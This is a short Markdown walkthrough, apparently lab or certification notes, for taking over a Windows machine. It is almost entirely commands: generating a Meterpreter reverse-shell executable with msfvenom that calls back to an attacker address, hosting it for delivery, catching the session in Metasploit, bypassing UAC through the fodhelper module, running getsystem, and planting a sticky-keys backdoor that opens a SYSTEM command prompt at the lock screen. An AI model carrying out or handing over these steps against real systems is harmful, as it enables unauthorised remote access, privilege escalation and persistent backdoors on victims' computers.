# Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys

1. Generate payload reverse shell for windows
   ```
    msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
   ```
2. Delivery payload to victim workstation (here webserver)
  ```
    python -m http.server 8080
```
3. Set up a listener on attacker machine (port 444). Use metasploit to use meterpreter and sessions background features
   ```
   msfconsole
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_Tcp
   set lhost / lport
   run
   ```

4. Once payload is executed, got a meterpreter session. Put it in background to exploit a bypass UAC via FodHelper vulnerability
```
  background
  search bypassuac
  use exploit/windows/local/bypassuac_fodhelper
  set session 1 (sessions -i* to list all active sessions)
  show options (to see which are required : LHOST=IP attacker, TARGET=0)
  exploit
```
```
getsystem -t 1 (nto meterpreter session to elevate privileges)
background
```
5. Once privileges escalation done into meterpreter session 2, exploit sticky keys to get
```
search sticky_keys
use post/windows/manage/sticky_keys
sessions -i*
set session 2
exploit
```
6. Log into windows victim machine, lock screen, press 5 times shift ==> sticky keys enable. It will open a cmd with System privileges
